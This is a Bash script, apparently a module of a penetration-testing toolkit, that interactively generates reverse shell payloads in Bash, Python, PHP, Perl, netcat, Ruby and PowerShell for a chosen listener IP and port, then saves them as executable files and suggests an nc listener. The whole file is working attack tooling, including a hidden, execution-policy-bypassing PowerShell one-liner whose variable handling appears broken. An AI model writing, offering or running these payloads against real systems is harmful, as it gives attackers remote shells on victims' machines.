#!/bin/bash
# File: modules/rev_shell.sh
# Author: Neo-virex

# Colors
RED="\e[31m"
GREEN="\e[32m"
BLUE="\e[34m"
YELLOW="\e[33m"
RESET="\e[0m"

OUTDIR="/tmp/outputs/reverse_shells"
mkdir -p "$OUTDIR"

echo -e "${BLUE}[*] Reverse Shell Generator Module${RESET}"

echo "Select the reverse shell type:"
echo "1) Bash"
echo "2) Python"
echo "3) PHP"
echo "4) Perl"
echo "5) Netcat (nc)"
echo "6) Ruby"
echo "7) PowerShell"
echo "8) Exit"

read -p "Enter choice [1-8]: " choice

read -p "Enter your listener IP (LHOST): " lhost
read -p "Enter your listener port (LPORT): " lport

case $choice in
    1)
        shellcode="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
        filename="bash_rev.sh"
        ;;
    2)
        shellcode="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
        filename="python_rev.py"
        ;;
    3)
        shellcode="<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'\"); ?>"
        filename="php_rev.php"
        ;;
    4)
        shellcode="perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        filename="perl_rev.pl"
        ;;
    5)
        shellcode="nc -e /bin/sh $lhost $lport"
        filename="nc_rev.sh"
        ;;
    6)
        shellcode="ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        filename="ruby_rev.rb"
        ;;
    7)
        shellcode="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
        filename="ps_rev.ps1"
        ;;
    8)
        echo "Exiting Reverse Shell Generator."
        exit 0
        ;;
    *)
        echo -e "${RED}Invalid choice.${RESET}"
        exit 1
        ;;
esac

echo -e "${GREEN}Generating reverse shell payload in $OUTDIR/$filename${RESET}"

echo "$shellcode" > "$OUTDIR/$filename"
chmod +x "$OUTDIR/$filename"

echo -e "${YELLOW}Payload saved to $OUTDIR/$filename${RESET}"
echo -e "${YELLOW}You can start a listener with: nc -lvnp $lport${RESET}"
